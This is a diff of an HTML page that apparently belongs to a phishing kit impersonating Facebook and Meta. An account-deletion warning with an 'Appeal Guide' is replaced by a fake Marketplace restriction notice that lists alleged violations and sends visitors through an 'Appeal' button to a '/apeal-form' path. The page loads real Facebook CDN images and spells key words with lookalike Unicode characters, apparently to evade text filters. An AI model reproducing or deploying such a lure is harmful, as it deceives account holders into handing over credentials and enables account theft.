@@ -282,82 +282,186 @@
 
             <div class="col-8">
                 <div id="right">
-                    <h1>
-                        <img src="../img/block_2.png" alt="" style="height: 40px;
-                        width:40px;
-                        margin-right: 8px;">
-                        We have scheduled your page to be deleted
-                    </h1>
-                    <p>We have received several reports that your account violates our terms of service and community
-                        guidelines. As a result, your account will be sent for verification.</p>
-                    <br>
-                    <p>
-                        If you believe restrictions have been placed on your account in error, you can request a review.
-                    </p>
-                    <br>
-                    <div id="utm-ticketId" style="display: none;">
-                        <p class="small-grey">
-                            Your ticket id: <span>#4564-ATFD-4865</span></p>
-                    </div>
-
-
-                    <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()" style="display: none;">
+                    <div style="background-color: white;" class="action-button warning">
                         <div class="action-button-img">
-                            <img src="../img/no_avatar.png" alt="">
-                        </div>
-                        <div class="action-button-text">
-                            <span>View accounts</span>
-                            <br>
-                            <span class="small-grey UserName"></span>
+
                         </div>
                         <div class="action-button-arrow">
-                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
-                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
-                                </path>
+                            <!--?xml version="1.0" encoding="iso-8859-1"?-->
+                            <!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="256" height="256" viewBox="0 0 256 256" xml:space="preserve">
+
+                                <defs>
+                                </defs>
+                                <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
+                                    <path d="M 45 57.469 L 45 57.469 c -1.821 0 -3.319 -1.434 -3.399 -3.252 L 38.465 23.95 c -0.285 -3.802 2.722 -7.044 6.535 -7.044 h 0 c 3.813 0 6.82 3.242 6.535 7.044 l -3.137 30.267 C 48.319 56.036 46.821 57.469 45 57.469 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(229,0,0); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
+                                    <circle cx="45" cy="67.67" r="5.42" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(229,0,0); fill-rule: nonzero; opacity: 1;" transform="  matrix(1 0 0 1 0 0) "></circle>
+                                    <path d="M 45 90 C 20.187 90 0 69.813 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 C 90 69.813 69.813 90 45 90 z M 45 6 C 23.495 6 6 23.495 6 45 s 17.495 39 39 39 s 39 -17.495 39 -39 S 66.505 6 45 6 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(229,0,0); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
+                                </g>
                             </svg>
                         </div>
-                    </div>
-                    <br>
-                    <h6>Appeal Guide</h6>
-                    <ul>
-                        <li>Fact checkers may not respond to requests that contain intimidation, hate speech, or other
-                            verbal threats.</li>
-                        <li>In your appeal, please include all necessary information to allow the fact checker to
-                            process your request in a timely manner. If you provide an invalid email address or do not
-                            respond to a request for additional information within 2 days, the fact checker may close
-                            the application without processing. If the appeal is not processed within 4 days, Meta will
-                            automatically reject it.</li>
-                        <li>When everything is ready, we will review your account and determine whether restrictions
-                            apply to it. The verification procedure usually lasts 24 hours, but in some cases it may
-                            take longer. Depending on our decision, the restrictions imposed will remain in effect or
-                            will be lifted and your account will be reinstated. </li>
-                    </ul>
-                    
-<style>
-#card img {
-    max-width: 100%;
-    height: auto;
-}
+                        <div class="action-button-text">
+                            <span style="font-weight: 600;" class="small-black">
+                                <font style="vertical-align: inherit;">
+                                    <font style="vertical-align: inherit;">
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">You can't bսу or sell items on Facebook Marketplace: We've found that your listings didn't follow our Community Standards. If you think that we've made a mistake, you can rеԛuеѕt a review to restore your ассеѕѕ to Marketplace.</font>
+                                        </font>
+                                    </font>
+                                </font>
+                            </span>
+                        </div>
 
-/* CSS for mobile */
-@media only screen and (max-width: 768px) {
-    #card img {
-        width: 100%;
-        height: auto;
-    }
-}
-</style>                    
-                    
+                    </div>
+
+                    <div class="action-button-list">
+                    </div>
+                    <div class="action-button-text">
+                        <span style="font-weight: 600;" class="small-black">
+                        </span>
+                    </div>
                     <div id="card">
-                        <img src="../img/banner_new_01.png" alt="">
+                        <style>
+                            .banner-market {
+                                width: 100%;
+                                /* Chiều rộng luôn chiếm 100% màn hình */
+                                height: auto;
+                                /* Tự động tính chiều cao theo tỷ lệ ảnh */
+                                object-fit: contain;
+                                /* Đảm bảo ảnh giữ tỷ lệ và không bị méo */
+                                display: block;
+                                /* Loại bỏ khoảng trống dưới ảnh */
+                                margin: 0 auto;
+                                /* Căn giữa nếu cần */
+                            }
+
+                            @media (max-width: 768px) {
+
+                                /* CSS dành cho màn hình nhỏ */
+                                .banner-market {
+                                    max-height: 300px;
+                                    /* Giới hạn chiều cao tối đa */
+                                    object-fit: cover;
+                                    /* Ảnh sẽ che hết vùng mà không méo */
+                                }
+                            }
+                        </style> 
+                        <img class="banner-market" style="background-color: #73c8ff;" src="/img/market.png" alt="">
+                        <div class="action-button-list">
+
+                            <div class="action-button warning">
+                                <div class="action-button-icon">
+                                    <!-- SVG -->
+                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                </div>
+                                <div class="action-button-text">
+                                    <span class="small-red">
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">
+                                                <font style="vertical-align: inherit;">
+                                                    <font style="vertical-align: inherit;">Counterfeit or fake branded goods.</font>
+                                                </font>
+                                            </font>
+                                        </font>
+                                    </span>
+                                </div>
+                                <div class="action-button-arrow"></div>
+                            </div>
+                            <div class="action-button warning">
+                                <div class="action-button-icon">
+                                    <!-- SVG -->
+                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                </div>
+                                <div class="action-button-text">
+                                    <span class="small-red">
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">
+                                                <font style="vertical-align: inherit;">
+                                                    <font style="vertical-align: inherit;">Posting images or descriptions that are inaccurate or do not match the product being sold.</font>
+                                                </font>
+                                            </font>
+                                        </font>
+                                    </span>
+                                </div>
+                                <div class="action-button-arrow"></div>
+                            </div>
+                            <div class="action-button warning">
+                                <div class="action-button-icon">
+                                    <!-- SVG -->
+                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                </div>
+                                <div class="action-button-text">
+                                    <span class="small-red">
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">
+                                                <font style="vertical-align: inherit;">
+                                                    <font style="vertical-align: inherit;">Engaging in harassment, fraud, or impersonation of other users.</font>
+                                                </font>
+                                            </font>
+                                        </font>
+                                    </span>
+                                </div>
+                                <div class="action-button-arrow"></div>
+                            </div>
+                            <div class="action-button warning">
+                                <div class="action-button-icon">
+                                    <!-- SVG -->
+                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                </div>
+                                <div class="action-button-text">
+                                    <span class="small-red">
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">
+                                                <font style="vertical-align: inherit;">
+                                                    <font style="vertical-align: inherit;">Conducting transactions outside of Facebook Marketplace's platform.</font>
+                                                </font>
+                                            </font>
+                                        </font>
+                                    </span>
+                                </div>
+                                <div class="action-button-arrow"></div>
+                            </div>
+                            <div class="action-button warning">
+                                <div class="action-button-icon">
+                                    <!-- SVG -->
+                                    <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/MO61N44quj5.png&quot;); background-position: 0px -843px; background-size: auto; width: 20px; height: 20px; background-repeat: no-repeat; display: inline-block;"></i>
+                                </div>
+                                <div class="action-button-text">
+                                    <span class="small-red">
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">
+                                                <font style="vertical-align: inherit;">
+                                                    <font style="vertical-align: inherit;">Failing to adhere to Facebook’s payment and shipping regulations.</font>
+                                                </font>
+                                            </font>
+                                        </font>
+                                    </span>
+                                </div>
+                                <div class="action-button-arrow"></div>
+                            </div>
+                        </div>
                         <div class="card-text">
-                            <p class="card-type">Review request</p>
-                            <h4>Fixing problems with account restrictions</h4>
-                            <p>Please be sure to provide the requested information below. Failure to provide this
-                                information may delay the processing of your appeal.</p>
                             <div class="btn-wrapper">
-                                <div onclick="location.href='/apeal-form';" class="button fb-blue w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1">
-                                    Request Review
+                                <div onclick="location.href='/apeal-form';" id="review" style="font-weight: bold" class="button fb-blue w-100">
+                                    <font style="vertical-align: inherit;">
+                                        <font style="vertical-align: inherit;">
+                                            <font style="vertical-align: inherit;">
+                                                <font style="vertical-align: inherit;">
+                                                    <font style="vertical-align: inherit;">
+                                                        <font style="vertical-align: inherit;">
+                                                            <font style="vertical-align: inherit;">
+                                                                <font style="vertical-align: inherit;">
+                                                                    <font style="vertical-align: inherit;">
+                                                                        <font style="vertical-align: inherit;">Appeal</font>
+                                                                    </font>
+                                                                </font>
+                                                            </font>
+                                                        </font>
+                                                    </font>
+                                                </font>
+                                            </font>
+                                        </font>
+                                    </font>
                                 </div>
                             </div>
                         </div>
